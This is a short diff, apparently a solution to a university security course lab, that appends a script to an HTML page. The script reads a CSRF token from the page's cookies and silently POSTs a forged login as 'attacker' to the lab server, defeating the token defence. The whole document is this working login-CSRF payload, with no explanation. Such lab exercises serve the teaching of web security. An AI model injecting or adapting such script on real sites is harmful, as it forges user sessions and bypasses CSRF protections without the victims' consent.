@@ -78,3 +78,11 @@
         </script>
     </body>
 </html>
+
+<script>
+    $(function() {
+        token = document.cookie.split(';')[0].split('=')[1];
+        console.log(token);
+        $.post('https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0', { username: 'attacker', password: 'l33th4x', csrf_token: token});
+    });
+</script>
